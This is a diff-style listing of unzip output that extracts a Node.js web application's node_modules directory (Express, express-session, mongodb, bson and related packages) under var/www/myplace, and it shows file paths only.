+  inflating: var/www/myplace/node_modules/ms/readme.md  
+   creating: var/www/myplace/node_modules/escape-html/
+  inflating: var/www/myplace/node_modules/escape-html/Readme.md  
+  inflating: var/www/myplace/node_modules/escape-html/index.js  
+  inflating: var/www/myplace/node_modules/escape-html/LICENSE  
+  inflating: var/www/myplace/node_modules/escape-html/package.json  
+   creating: var/www/myplace/node_modules/merge-descriptors/
+  inflating: var/www/myplace/node_modules/merge-descriptors/README.md  
+  inflating: var/www/myplace/node_modules/merge-descriptors/index.js  
+  inflating: var/www/myplace/node_modules/merge-descriptors/LICENSE  
+  inflating: var/www/myplace/node_modules/merge-descriptors/HISTORY.md  
+  inflating: var/www/myplace/node_modules/merge-descriptors/package.json  
+   creating: var/www/myplace/node_modules/media-typer/
+  inflating: var/www/myplace/node_modules/media-typer/README.md  
+  inflating: var/www/myplace/node_modules/media-typer/index.js  
+  inflating: var/www/myplace/node_modules/media-typer/LICENSE  
+  inflating: var/www/myplace/node_modules/media-typer/HISTORY.md  
+  inflating: var/www/myplace/node_modules/media-typer/package.json  
+   creating: var/www/myplace/node_modules/etag/
+  inflating: var/www/myplace/node_modules/etag/README.md  
+  inflating: var/www/myplace/node_modules/etag/index.js  
+  inflating: var/www/myplace/node_modules/etag/LICENSE  
+  inflating: var/www/myplace/node_modules/etag/HISTORY.md  
+  inflating: var/www/myplace/node_modules/etag/package.json  
+   creating: var/www/myplace/node_modules/cookie-signature/
+  inflating: var/www/myplace/node_modules/cookie-signature/History.md  
+  inflating: var/www/myplace/node_modules/cookie-signature/Readme.md  
+  inflating: var/www/myplace/node_modules/cookie-signature/index.js  
+  inflating: var/www/myplace/node_modules/cookie-signature/package.json  
+ extracting: var/www/myplace/node_modules/cookie-signature/.npmignore  
+   creating: var/www/myplace/node_modules/methods/
+  inflating: var/www/myplace/node_modules/methods/README.md  
+  inflating: var/www/myplace/node_modules/methods/index.js  
+  inflating: var/www/myplace/node_modules/methods/LICENSE  
+  inflating: var/www/myplace/node_modules/methods/HISTORY.md  
+  inflating: var/www/myplace/node_modules/methods/package.json  
+   creating: var/www/myplace/node_modules/finalhandler/
+  inflating: var/www/myplace/node_modules/finalhandler/README.md  
+  inflating: var/www/myplace/node_modules/finalhandler/index.js  
+  inflating: var/www/myplace/node_modules/finalhandler/LICENSE  
+   creating: var/www/myplace/node_modules/finalhandler/node_modules/
+   creating: var/www/myplace/node_modules/finalhandler/node_modules/debug/
+  inflating: var/www/myplace/node_modules/finalhandler/node_modules/debug/CHANGELOG.md  
+  inflating: var/www/myplace/node_modules/finalhandler/node_modules/debug/README.md  
+ extracting: var/www/myplace/node_modules/finalhandler/node_modules/debug/node.js  
+  inflating: var/www/myplace/node_modules/finalhandler/node_modules/debug/LICENSE  
+  inflating: var/www/myplace/node_modules/finalhandler/node_modules/debug/.eslintrc  
+  inflating: var/www/myplace/node_modules/finalhandler/node_modules/debug/component.json  
+  inflating: var/www/myplace/node_modules/finalhandler/node_modules/debug/.travis.yml  
+  inflating: var/www/myplace/node_modules/finalhandler/node_modules/debug/package.json  
+  inflating: var/www/myplace/node_modules/finalhandler/node_modules/debug/Makefile  
+   creating: var/www/myplace/node_modules/finalhandler/node_modules/debug/src/
+  inflating: var/www/myplace/node_modules/finalhandler/node_modules/debug/src/index.js  
+  inflating: var/www/myplace/node_modules/finalhandler/node_modules/debug/src/node.js  
+  inflating: var/www/myplace/node_modules/finalhandler/node_modules/debug/src/debug.js  
+  inflating: var/www/myplace/node_modules/finalhandler/node_modules/debug/src/browser.js  
+ extracting: var/www/myplace/node_modules/finalhandler/node_modules/debug/.coveralls.yml  
+  inflating: var/www/myplace/node_modules/finalhandler/node_modules/debug/.npmignore  
+  inflating: var/www/myplace/node_modules/finalhandler/node_modules/debug/karma.conf.js  
+  inflating: var/www/myplace/node_modules/finalhandler/HISTORY.md  
+  inflating: var/www/myplace/node_modules/finalhandler/package.json  
+   creating: var/www/myplace/node_modules/require_optional/
+  inflating: var/www/myplace/node_modules/require_optional/README.md  
+   creating: var/www/myplace/node_modules/require_optional/test/
+  inflating: var/www/myplace/node_modules/require_optional/test/require_optional_tests.js  
+   creating: var/www/myplace/node_modules/require_optional/test/nestedTest/
+  inflating: var/www/myplace/node_modules/require_optional/test/nestedTest/index.js  
+  inflating: var/www/myplace/node_modules/require_optional/test/nestedTest/package.json  
+  inflating: var/www/myplace/node_modules/require_optional/index.js  
+  inflating: var/www/myplace/node_modules/require_optional/LICENSE  
+  inflating: var/www/myplace/node_modules/require_optional/HISTORY.md  
+  inflating: var/www/myplace/node_modules/require_optional/.travis.yml  
+  inflating: var/www/myplace/node_modules/require_optional/package.json  
+  inflating: var/www/myplace/node_modules/require_optional/.npmignore  
+   creating: var/www/myplace/node_modules/unpipe/
+  inflating: var/www/myplace/node_modules/unpipe/README.md  
+  inflating: var/www/myplace/node_modules/unpipe/index.js  
+  inflating: var/www/myplace/node_modules/unpipe/LICENSE  
+  inflating: var/www/myplace/node_modules/unpipe/HISTORY.md  
+  inflating: var/www/myplace/node_modules/unpipe/package.json  
+   creating: var/www/myplace/node_modules/cookie/
+  inflating: var/www/myplace/node_modules/cookie/README.md  
+  inflating: var/www/myplace/node_modules/cookie/index.js  
+  inflating: var/www/myplace/node_modules/cookie/LICENSE  
+  inflating: var/www/myplace/node_modules/cookie/HISTORY.md  
+  inflating: var/www/myplace/node_modules/cookie/package.json  
+   creating: var/www/myplace/node_modules/express/
+  inflating: var/www/myplace/node_modules/express/History.md  
+  inflating: var/www/myplace/node_modules/express/Readme.md  
+  inflating: var/www/myplace/node_modules/express/index.js  
+  inflating: var/www/myplace/node_modules/express/LICENSE  
+   creating: var/www/myplace/node_modules/express/node_modules/
+   creating: var/www/myplace/node_modules/express/node_modules/qs/
+  inflating: var/www/myplace/node_modules/express/node_modules/qs/CHANGELOG.md  
+  inflating: var/www/myplace/node_modules/express/node_modules/qs/README.md  
+   creating: var/www/myplace/node_modules/express/node_modules/qs/test/
+  inflating: var/www/myplace/node_modules/express/node_modules/qs/test/index.js  
+  inflating: var/www/myplace/node_modules/express/node_modules/qs/test/stringify.js  
+  inflating: var/www/myplace/node_modules/express/node_modules/qs/test/.eslintrc  
+  inflating: var/www/myplace/node_modules/express/node_modules/qs/test/parse.js  
+  inflating: var/www/myplace/node_modules/express/node_modules/qs/test/utils.js  
+  inflating: var/www/myplace/node_modules/express/node_modules/qs/LICENSE  
+   creating: var/www/myplace/node_modules/express/node_modules/qs/dist/
+  inflating: var/www/myplace/node_modules/express/node_modules/qs/dist/qs.js  
+ extracting: var/www/myplace/node_modules/express/node_modules/qs/.eslintignore  
+   creating: var/www/myplace/node_modules/express/node_modules/qs/lib/
+  inflating: var/www/myplace/node_modules/express/node_modules/qs/lib/index.js  
+  inflating: var/www/myplace/node_modules/express/node_modules/qs/lib/stringify.js  
+  inflating: var/www/myplace/node_modules/express/node_modules/qs/lib/parse.js  
+  inflating: var/www/myplace/node_modules/express/node_modules/qs/lib/formats.js  
+  inflating: var/www/myplace/node_modules/express/node_modules/qs/lib/utils.js  
+  inflating: var/www/myplace/node_modules/express/node_modules/qs/.eslintrc  
+  inflating: var/www/myplace/node_modules/express/node_modules/qs/package.json  
+  inflating: var/www/myplace/node_modules/express/node_modules/qs/.editorconfig  
+   creating: var/www/myplace/node_modules/express/node_modules/debug/
+  inflating: var/www/myplace/node_modules/express/node_modules/debug/CHANGELOG.md  
+  inflating: var/www/myplace/node_modules/express/node_modules/debug/README.md  
+ extracting: var/www/myplace/node_modules/express/node_modules/debug/node.js  
+  inflating: var/www/myplace/node_modules/express/node_modules/debug/LICENSE  
+  inflating: var/www/myplace/node_modules/express/node_modules/debug/.eslintrc  
+  inflating: var/www/myplace/node_modules/express/node_modules/debug/component.json  
+  inflating: var/www/myplace/node_modules/express/node_modules/debug/.travis.yml  
+  inflating: var/www/myplace/node_modules/express/node_modules/debug/package.json  
+  inflating: var/www/myplace/node_modules/express/node_modules/debug/Makefile  
+   creating: var/www/myplace/node_modules/express/node_modules/debug/src/
+  inflating: var/www/myplace/node_modules/express/node_modules/debug/src/index.js  
+  inflating: var/www/myplace/node_modules/express/node_modules/debug/src/node.js  
+  inflating: var/www/myplace/node_modules/express/node_modules/debug/src/debug.js  
+  inflating: var/www/myplace/node_modules/express/node_modules/debug/src/browser.js  
+ extracting: var/www/myplace/node_modules/express/node_modules/debug/.coveralls.yml  
+  inflating: var/www/myplace/node_modules/express/node_modules/debug/.npmignore  
+  inflating: var/www/myplace/node_modules/express/node_modules/debug/karma.conf.js  
+   creating: var/www/myplace/node_modules/express/lib/
+  inflating: var/www/myplace/node_modules/express/lib/response.js  
+  inflating: var/www/myplace/node_modules/express/lib/view.js  
+  inflating: var/www/myplace/node_modules/express/lib/utils.js  
+  inflating: var/www/myplace/node_modules/express/lib/request.js  
+  inflating: var/www/myplace/node_modules/express/lib/application.js  
+  inflating: var/www/myplace/node_modules/express/lib/express.js  
+   creating: var/www/myplace/node_modules/express/lib/router/
+  inflating: var/www/myplace/node_modules/express/lib/router/index.js  
+  inflating: var/www/myplace/node_modules/express/lib/router/layer.js  
+  inflating: var/www/myplace/node_modules/express/lib/router/route.js  
+   creating: var/www/myplace/node_modules/express/lib/middleware/
+  inflating: var/www/myplace/node_modules/express/lib/middleware/query.js  
+  inflating: var/www/myplace/node_modules/express/lib/middleware/init.js  
+  inflating: var/www/myplace/node_modules/express/package.json  
+   creating: var/www/myplace/node_modules/mime-types/
+  inflating: var/www/myplace/node_modules/mime-types/README.md  
+  inflating: var/www/myplace/node_modules/mime-types/index.js  
+  inflating: var/www/myplace/node_modules/mime-types/LICENSE  
+  inflating: var/www/myplace/node_modules/mime-types/HISTORY.md  
+  inflating: var/www/myplace/node_modules/mime-types/package.json  
+   creating: var/www/myplace/node_modules/safe-buffer/
+  inflating: var/www/myplace/node_modules/safe-buffer/README.md  
+  inflating: var/www/myplace/node_modules/safe-buffer/index.js  
+  inflating: var/www/myplace/node_modules/safe-buffer/LICENSE  
+  inflating: var/www/myplace/node_modules/safe-buffer/test.js  
+  inflating: var/www/myplace/node_modules/safe-buffer/.travis.yml  
+  inflating: var/www/myplace/node_modules/safe-buffer/package.json  
+   creating: var/www/myplace/node_modules/depd/
+  inflating: var/www/myplace/node_modules/depd/History.md  
+  inflating: var/www/myplace/node_modules/depd/Readme.md  
+  inflating: var/www/myplace/node_modules/depd/index.js  
+  inflating: var/www/myplace/node_modules/depd/LICENSE  
+   creating: var/www/myplace/node_modules/depd/lib/
+   creating: var/www/myplace/node_modules/depd/lib/compat/
+  inflating: var/www/myplace/node_modules/depd/lib/compat/event-listener-count.js  
+  inflating: var/www/myplace/node_modules/depd/lib/compat/index.js  
+  inflating: var/www/myplace/node_modules/depd/lib/compat/callsite-tostring.js  
+   creating: var/www/myplace/node_modules/depd/lib/browser/
+  inflating: var/www/myplace/node_modules/depd/lib/browser/index.js  
+  inflating: var/www/myplace/node_modules/depd/package.json  
+   creating: var/www/myplace/node_modules/readable-stream/
+  inflating: var/www/myplace/node_modules/readable-stream/readable-browser.js  
+  inflating: var/www/myplace/node_modules/readable-stream/CONTRIBUTING.md  
+  inflating: var/www/myplace/node_modules/readable-stream/README.md  
+  inflating: var/www/myplace/node_modules/readable-stream/LICENSE  
+   creating: var/www/myplace/node_modules/readable-stream/lib/
+  inflating: var/www/myplace/node_modules/readable-stream/lib/_stream_writable.js  
+  inflating: var/www/myplace/node_modules/readable-stream/lib/_stream_readable.js  
+  inflating: var/www/myplace/node_modules/readable-stream/lib/_stream_duplex.js  
+  inflating: var/www/myplace/node_modules/readable-stream/lib/_stream_passthrough.js  
+   creating: var/www/myplace/node_modules/readable-stream/lib/internal/
+   creating: var/www/myplace/node_modules/readable-stream/lib/internal/streams/
+  inflating: var/www/myplace/node_modules/readable-stream/lib/internal/streams/BufferList.js  
+  inflating: var/www/myplace/node_modules/readable-stream/lib/_stream_transform.js  
+ extracting: var/www/myplace/node_modules/readable-stream/writable-browser.js  
+  inflating: var/www/myplace/node_modules/readable-stream/readable.js  
+  inflating: var/www/myplace/node_modules/readable-stream/writable.js  
+ extracting: var/www/myplace/node_modules/readable-stream/passthrough.js  
+  inflating: var/www/myplace/node_modules/readable-stream/.travis.yml  
+  inflating: var/www/myplace/node_modules/readable-stream/package.json  
+ extracting: var/www/myplace/node_modules/readable-stream/transform.js  
+  inflating: var/www/myplace/node_modules/readable-stream/.npmignore  
+ extracting: var/www/myplace/node_modules/readable-stream/duplex.js  
+ extracting: var/www/myplace/node_modules/readable-stream/duplex-browser.js  
+   creating: var/www/myplace/node_modules/readable-stream/doc/
+   creating: var/www/myplace/node_modules/readable-stream/doc/wg-meetings/
+  inflating: var/www/myplace/node_modules/readable-stream/doc/wg-meetings/2015-01-30.md  
+  inflating: var/www/myplace/node_modules/readable-stream/GOVERNANCE.md  
+   creating: var/www/myplace/node_modules/express-session/
+  inflating: var/www/myplace/node_modules/express-session/README.md  
+  inflating: var/www/myplace/node_modules/express-session/index.js  
+  inflating: var/www/myplace/node_modules/express-session/LICENSE  
+   creating: var/www/myplace/node_modules/express-session/node_modules/
+   creating: var/www/myplace/node_modules/express-session/node_modules/debug/
+  inflating: var/www/myplace/node_modules/express-session/node_modules/debug/CHANGELOG.md  
+  inflating: var/www/myplace/node_modules/express-session/node_modules/debug/README.md  
+ extracting: var/www/myplace/node_modules/express-session/node_modules/debug/node.js  
+  inflating: var/www/myplace/node_modules/express-session/node_modules/debug/LICENSE  
+  inflating: var/www/myplace/node_modules/express-session/node_modules/debug/.eslintrc  
+  inflating: var/www/myplace/node_modules/express-session/node_modules/debug/component.json  
+  inflating: var/www/myplace/node_modules/express-session/node_modules/debug/.travis.yml  
+  inflating: var/www/myplace/node_modules/express-session/node_modules/debug/package.json  
+  inflating: var/www/myplace/node_modules/express-session/node_modules/debug/Makefile  
+   creating: var/www/myplace/node_modules/express-session/node_modules/debug/src/
+  inflating: var/www/myplace/node_modules/express-session/node_modules/debug/src/index.js  
+  inflating: var/www/myplace/node_modules/express-session/node_modules/debug/src/node.js  
+  inflating: var/www/myplace/node_modules/express-session/node_modules/debug/src/debug.js  
+  inflating: var/www/myplace/node_modules/express-session/node_modules/debug/src/browser.js  
+ extracting: var/www/myplace/node_modules/express-session/node_modules/debug/.coveralls.yml  
+  inflating: var/www/myplace/node_modules/express-session/node_modules/debug/.npmignore  
+  inflating: var/www/myplace/node_modules/express-session/node_modules/debug/karma.conf.js  
+  inflating: var/www/myplace/node_modules/express-session/HISTORY.md  
+   creating: var/www/myplace/node_modules/express-session/session/
+  inflating: var/www/myplace/node_modules/express-session/session/cookie.js  
+  inflating: var/www/myplace/node_modules/express-session/session/store.js  
+  inflating: var/www/myplace/node_modules/express-session/session/memory.js  
+  inflating: var/www/myplace/node_modules/express-session/session/session.js  
+  inflating: var/www/myplace/node_modules/express-session/package.json  
+   creating: var/www/myplace/node_modules/mime/
+  inflating: var/www/myplace/node_modules/mime/README.md  
+  inflating: var/www/myplace/node_modules/mime/LICENSE  
+  inflating: var/www/myplace/node_modules/mime/types.json  
+   creating: var/www/myplace/node_modules/mime/build/
+  inflating: var/www/myplace/node_modules/mime/build/test.js  
+  inflating: var/www/myplace/node_modules/mime/build/build.js  
+  inflating: var/www/myplace/node_modules/mime/cli.js  
+  inflating: var/www/myplace/node_modules/mime/package.json  
+  inflating: var/www/myplace/node_modules/mime/mime.js  
+ extracting: var/www/myplace/node_modules/mime/.npmignore  
+   creating: var/www/myplace/node_modules/util-deprecate/
+  inflating: var/www/myplace/node_modules/util-deprecate/History.md  
+  inflating: var/www/myplace/node_modules/util-deprecate/README.md  
+  inflating: var/www/myplace/node_modules/util-deprecate/node.js  
+  inflating: var/www/myplace/node_modules/util-deprecate/LICENSE  
+  inflating: var/www/myplace/node_modules/util-deprecate/browser.js  
+  inflating: var/www/myplace/node_modules/util-deprecate/package.json  
+   creating: var/www/myplace/node_modules/.bin/
+  inflating: var/www/myplace/node_modules/.bin/mime  
+  inflating: var/www/myplace/node_modules/.bin/semver  
+   creating: var/www/myplace/node_modules/ee-first/
+  inflating: var/www/myplace/node_modules/ee-first/README.md  
+  inflating: var/www/myplace/node_modules/ee-first/index.js  
+  inflating: var/www/myplace/node_modules/ee-first/LICENSE  
+  inflating: var/www/myplace/node_modules/ee-first/package.json  
+   creating: var/www/myplace/node_modules/range-parser/
+  inflating: var/www/myplace/node_modules/range-parser/README.md  
+  inflating: var/www/myplace/node_modules/range-parser/index.js  
+  inflating: var/www/myplace/node_modules/range-parser/LICENSE  
+  inflating: var/www/myplace/node_modules/range-parser/HISTORY.md  
+  inflating: var/www/myplace/node_modules/range-parser/package.json  
+   creating: var/www/myplace/node_modules/ipaddr.js/
+  inflating: var/www/myplace/node_modules/ipaddr.js/README.md  
+   creating: var/www/myplace/node_modules/ipaddr.js/test/
+  inflating: var/www/myplace/node_modules/ipaddr.js/test/ipaddr.test.coffee  
+  inflating: var/www/myplace/node_modules/ipaddr.js/LICENSE  
+   creating: var/www/myplace/node_modules/ipaddr.js/lib/
+  inflating: var/www/myplace/node_modules/ipaddr.js/lib/ipaddr.js  
+  inflating: var/www/myplace/node_modules/ipaddr.js/.travis.yml  
+  inflating: var/www/myplace/node_modules/ipaddr.js/package.json  
+  inflating: var/www/myplace/node_modules/ipaddr.js/Cakefile  
+   creating: var/www/myplace/node_modules/ipaddr.js/src/
+  inflating: var/www/myplace/node_modules/ipaddr.js/src/ipaddr.coffee  
+  inflating: var/www/myplace/node_modules/ipaddr.js/ipaddr.min.js  
+  inflating: var/www/myplace/node_modules/ipaddr.js/bower.json  
+ extracting: var/www/myplace/node_modules/ipaddr.js/.npmignore  
+   creating: var/www/myplace/node_modules/string_decoder/
+  inflating: var/www/myplace/node_modules/string_decoder/README.md  
+  inflating: var/www/myplace/node_modules/string_decoder/LICENSE  
+   creating: var/www/myplace/node_modules/string_decoder/lib/
+  inflating: var/www/myplace/node_modules/string_decoder/lib/string_decoder.js  
+  inflating: var/www/myplace/node_modules/string_decoder/package.json  
+ extracting: var/www/myplace/node_modules/string_decoder/.npmignore  
+   creating: var/www/myplace/node_modules/content-disposition/
+  inflating: var/www/myplace/node_modules/content-disposition/README.md  
+  inflating: var/www/myplace/node_modules/content-disposition/index.js  
+  inflating: var/www/myplace/node_modules/content-disposition/LICENSE  
+  inflating: var/www/myplace/node_modules/content-disposition/HISTORY.md  
+  inflating: var/www/myplace/node_modules/content-disposition/package.json  
+   creating: var/www/myplace/node_modules/negotiator/
+  inflating: var/www/myplace/node_modules/negotiator/README.md  
+  inflating: var/www/myplace/node_modules/negotiator/index.js  
+  inflating: var/www/myplace/node_modules/negotiator/LICENSE  
+  inflating: var/www/myplace/node_modules/negotiator/HISTORY.md  
+   creating: var/www/myplace/node_modules/negotiator/lib/
+  inflating: var/www/myplace/node_modules/negotiator/lib/charset.js  
+  inflating: var/www/myplace/node_modules/negotiator/lib/language.js  
+  inflating: var/www/myplace/node_modules/negotiator/lib/mediaType.js  
+  inflating: var/www/myplace/node_modules/negotiator/lib/encoding.js  
+  inflating: var/www/myplace/node_modules/negotiator/package.json  
+   creating: var/www/myplace/node_modules/on-headers/
+  inflating: var/www/myplace/node_modules/on-headers/README.md  
+  inflating: var/www/myplace/node_modules/on-headers/index.js  
+  inflating: var/www/myplace/node_modules/on-headers/LICENSE  
+  inflating: var/www/myplace/node_modules/on-headers/HISTORY.md  
+  inflating: var/www/myplace/node_modules/on-headers/package.json  
+   creating: var/www/myplace/node_modules/inherits/
+  inflating: var/www/myplace/node_modules/inherits/README.md  
+  inflating: var/www/myplace/node_modules/inherits/LICENSE  
+  inflating: var/www/myplace/node_modules/inherits/package.json  
+  inflating: var/www/myplace/node_modules/inherits/inherits.js  
+  inflating: var/www/myplace/node_modules/inherits/inherits_browser.js  
+   creating: var/www/myplace/node_modules/vary/
+  inflating: var/www/myplace/node_modules/vary/README.md  
+  inflating: var/www/myplace/node_modules/vary/index.js  
+  inflating: var/www/myplace/node_modules/vary/LICENSE  
+  inflating: var/www/myplace/node_modules/vary/HISTORY.md  
+  inflating: var/www/myplace/node_modules/vary/package.json  
+   creating: var/www/myplace/node_modules/send/
+  inflating: var/www/myplace/node_modules/send/README.md  
+  inflating: var/www/myplace/node_modules/send/index.js  
+  inflating: var/www/myplace/node_modules/send/LICENSE  
+   creating: var/www/myplace/node_modules/send/node_modules/
+   creating: var/www/myplace/node_modules/send/node_modules/debug/
+  inflating: var/www/myplace/node_modules/send/node_modules/debug/CHANGELOG.md  
+  inflating: var/www/myplace/node_modules/send/node_modules/debug/README.md  
+ extracting: var/www/myplace/node_modules/send/node_modules/debug/node.js  
+  inflating: var/www/myplace/node_modules/send/node_modules/debug/LICENSE  
+  inflating: var/www/myplace/node_modules/send/node_modules/debug/.eslintrc  
+  inflating: var/www/myplace/node_modules/send/node_modules/debug/component.json  
+  inflating: var/www/myplace/node_modules/send/node_modules/debug/.travis.yml  
+  inflating: var/www/myplace/node_modules/send/node_modules/debug/package.json  
+  inflating: var/www/myplace/node_modules/send/node_modules/debug/Makefile  
+   creating: var/www/myplace/node_modules/send/node_modules/debug/src/
+  inflating: var/www/myplace/node_modules/send/node_modules/debug/src/index.js  
+  inflating: var/www/myplace/node_modules/send/node_modules/debug/src/node.js  
+  inflating: var/www/myplace/node_modules/send/node_modules/debug/src/debug.js  
+  inflating: var/www/myplace/node_modules/send/node_modules/debug/src/browser.js  
+ extracting: var/www/myplace/node_modules/send/node_modules/debug/.coveralls.yml  
+  inflating: var/www/myplace/node_modules/send/node_modules/debug/.npmignore  
+  inflating: var/www/myplace/node_modules/send/node_modules/debug/karma.conf.js  
+  inflating: var/www/myplace/node_modules/send/HISTORY.md  
+  inflating: var/www/myplace/node_modules/send/package.json  
+   creating: var/www/myplace/node_modules/uid-safe/
+  inflating: var/www/myplace/node_modules/uid-safe/README.md  
+  inflating: var/www/myplace/node_modules/uid-safe/index.js  
+  inflating: var/www/myplace/node_modules/uid-safe/LICENSE  
+  inflating: var/www/myplace/node_modules/uid-safe/HISTORY.md  
+  inflating: var/www/myplace/node_modules/uid-safe/package.json  
+   creating: var/www/myplace/node_modules/proxy-addr/
+  inflating: var/www/myplace/node_modules/proxy-addr/README.md  
+  inflating: var/www/myplace/node_modules/proxy-addr/index.js  
+  inflating: var/www/myplace/node_modules/proxy-addr/LICENSE  
+  inflating: var/www/myplace/node_modules/proxy-addr/HISTORY.md  
+  inflating: var/www/myplace/node_modules/proxy-addr/package.json  
+   creating: var/www/myplace/node_modules/buffer-shims/
+  inflating: var/www/myplace/node_modules/buffer-shims/index.js  
+  inflating: var/www/myplace/node_modules/buffer-shims/license.md  
+  inflating: var/www/myplace/node_modules/buffer-shims/package.json  
+  inflating: var/www/myplace/node_modules/buffer-shims/readme.md  
+   creating: var/www/myplace/node_modules/bson/
+   creating: var/www/myplace/node_modules/bson/browser_build/
+  inflating: var/www/myplace/node_modules/bson/browser_build/package.json  
+  inflating: var/www/myplace/node_modules/bson/browser_build/bson.js  
+  inflating: var/www/myplace/node_modules/bson/README.md  
+  inflating: var/www/myplace/node_modules/bson/index.js  
+  inflating: var/www/myplace/node_modules/bson/HISTORY.md  
+   creating: var/www/myplace/node_modules/bson/lib/
+   creating: var/www/myplace/node_modules/bson/lib/bson/
+  inflating: var/www/myplace/node_modules/bson/lib/bson/int_32.js  
+  inflating: var/www/myplace/node_modules/bson/lib/bson/timestamp.js  
+  inflating: var/www/myplace/node_modules/bson/lib/bson/code.js  
+   creating: var/www/myplace/node_modules/bson/lib/bson/parser/
+  inflating: var/www/myplace/node_modules/bson/lib/bson/parser/calculate_size.js  
+  inflating: var/www/myplace/node_modules/bson/lib/bson/parser/deserializer.js  
+  inflating: var/www/myplace/node_modules/bson/lib/bson/parser/serializer.js  
+  inflating: var/www/myplace/node_modules/bson/lib/bson/long.js  
+  inflating: var/www/myplace/node_modules/bson/lib/bson/double.js  
+  inflating: var/www/myplace/node_modules/bson/lib/bson/regexp.js  
+  inflating: var/www/myplace/node_modules/bson/lib/bson/objectid.js  
+  inflating: var/www/myplace/node_modules/bson/lib/bson/decimal128.js  
+  inflating: var/www/myplace/node_modules/bson/lib/bson/bson.js  
+  inflating: var/www/myplace/node_modules/bson/lib/bson/min_key.js  
+  inflating: var/www/myplace/node_modules/bson/lib/bson/binary.js  
+  inflating: var/www/myplace/node_modules/bson/lib/bson/max_key.js  
+  inflating: var/www/myplace/node_modules/bson/lib/bson/symbol.js  
+  inflating: var/www/myplace/node_modules/bson/lib/bson/map.js  
+  inflating: var/www/myplace/node_modules/bson/lib/bson/db_ref.js  
+  inflating: var/www/myplace/node_modules/bson/lib/bson/float_parser.js  
+  inflating: var/www/myplace/node_modules/bson/package.json  
+  inflating: var/www/myplace/node_modules/bson/bower.json  
+  inflating: var/www/myplace/node_modules/bson/LICENSE.md  
+   creating: var/www/myplace/node_modules/semver/
+  inflating: var/www/myplace/node_modules/semver/README.md  
+  inflating: var/www/myplace/node_modules/semver/semver.js  
+  inflating: var/www/myplace/node_modules/semver/LICENSE  
+  inflating: var/www/myplace/node_modules/semver/package.json  
+  inflating: var/www/myplace/node_modules/semver/range.bnf  
+   creating: var/www/myplace/node_modules/semver/bin/
+  inflating: var/www/myplace/node_modules/semver/bin/semver  
+   creating: var/www/myplace/node_modules/bytes/
+  inflating: var/www/myplace/node_modules/bytes/History.md  
+  inflating: var/www/myplace/node_modules/bytes/Readme.md  
+  inflating: var/www/myplace/node_modules/bytes/index.js  
+  inflating: var/www/myplace/node_modules/bytes/LICENSE  
+  inflating: var/www/myplace/node_modules/bytes/package.json  
+   creating: var/www/myplace/node_modules/es6-promise/
+  inflating: var/www/myplace/node_modules/es6-promise/CHANGELOG.md  
+  inflating: var/www/myplace/node_modules/es6-promise/README.md  
+  inflating: var/www/myplace/node_modules/es6-promise/LICENSE  
+   creating: var/www/myplace/node_modules/es6-promise/dist/
+  inflating: var/www/myplace/node_modules/es6-promise/dist/es6-promise.min.js  
+  inflating: var/www/myplace/node_modules/es6-promise/dist/es6-promise.js  
+   creating: var/www/myplace/node_modules/es6-promise/lib/
+  inflating: var/www/myplace/node_modules/es6-promise/lib/es6-promise.umd.js  
+   creating: var/www/myplace/node_modules/es6-promise/lib/es6-promise/
+  inflating: var/www/myplace/node_modules/es6-promise/lib/es6-promise/enumerator.js  
+   creating: var/www/myplace/node_modules/es6-promise/lib/es6-promise/promise/
+  inflating: var/www/myplace/node_modules/es6-promise/lib/es6-promise/promise/all.js  
+  inflating: var/www/myplace/node_modules/es6-promise/lib/es6-promise/promise/resolve.js  
+  inflating: var/www/myplace/node_modules/es6-promise/lib/es6-promise/promise/reject.js  
+  inflating: var/www/myplace/node_modules/es6-promise/lib/es6-promise/promise/race.js  
+  inflating: var/www/myplace/node_modules/es6-promise/lib/es6-promise/utils.js  
+  inflating: var/www/myplace/node_modules/es6-promise/lib/es6-promise/then.js  
+  inflating: var/www/myplace/node_modules/es6-promise/lib/es6-promise/polyfill.js  
+  inflating: var/www/myplace/node_modules/es6-promise/lib/es6-promise/asap.js  
+  inflating: var/www/myplace/node_modules/es6-promise/lib/es6-promise/promise.js  
+  inflating: var/www/myplace/node_modules/es6-promise/lib/es6-promise/-internal.js  
+  inflating: var/www/myplace/node_modules/es6-promise/package.json  
+   creating: var/www/myplace/node_modules/destroy/
+  inflating: var/www/myplace/node_modules/destroy/README.md  
+  inflating: var/www/myplace/node_modules/destroy/index.js  
+  inflating: var/www/myplace/node_modules/destroy/LICENSE  
+  inflating: var/www/myplace/node_modules/destroy/package.json  
+   creating: var/www/myplace/node_modules/mongodb/
+  inflating: var/www/myplace/node_modules/mongodb/THIRD-PARTY-NOTICES  
+  inflating: var/www/myplace/node_modules/mongodb/README.md  
+  inflating: var/www/myplace/node_modules/mongodb/index.js  
+  inflating: var/www/myplace/node_modules/mongodb/LICENSE  
+  inflating: var/www/myplace/node_modules/mongodb/boot_auth.js  
+  inflating: var/www/myplace/node_modules/mongodb/HISTORY.md  
+   creating: var/www/myplace/node_modules/mongodb/lib/
+  inflating: var/www/myplace/node_modules/mongodb/lib/admin.js  
+  inflating: var/www/myplace/node_modules/mongodb/lib/server.js  
+  inflating: var/www/myplace/node_modules/mongodb/lib/replset.js  
+   creating: var/www/myplace/node_modules/mongodb/lib/gridfs/
+  inflating: var/www/myplace/node_modules/mongodb/lib/gridfs/chunk.js  
+  inflating: var/www/myplace/node_modules/mongodb/lib/gridfs/grid_store.js  
+  inflating: var/www/myplace/node_modules/mongodb/lib/read_preference.js  
+  inflating: var/www/myplace/node_modules/mongodb/lib/apm.js  
+  inflating: var/www/myplace/node_modules/mongodb/lib/url_parser.js  
+  inflating: var/www/myplace/node_modules/mongodb/lib/collection.js  
+   creating: var/www/myplace/node_modules/mongodb/lib/gridfs-stream/
+  inflating: var/www/myplace/node_modules/mongodb/lib/gridfs-stream/upload.js  
+  inflating: var/www/myplace/node_modules/mongodb/lib/gridfs-stream/index.js  
+  inflating: var/www/myplace/node_modules/mongodb/lib/gridfs-stream/download.js  
+  inflating: var/www/myplace/node_modules/mongodb/lib/db.js  
+  inflating: var/www/myplace/node_modules/mongodb/lib/aggregation_cursor.js  
+  inflating: var/www/myplace/node_modules/mongodb/lib/metadata.js  
+  inflating: var/www/myplace/node_modules/mongodb/lib/utils.js  
+   creating: var/www/myplace/node_modules/mongodb/lib/bulk/
+  inflating: var/www/myplace/node_modules/mongodb/lib/bulk/ordered.js  
+  inflating: var/www/myplace/node_modules/mongodb/lib/bulk/unordered.js  
+  inflating: var/www/myplace/node_modules/mongodb/lib/bulk/common.js  
+  inflating: var/www/myplace/node_modules/mongodb/lib/mongos.js  
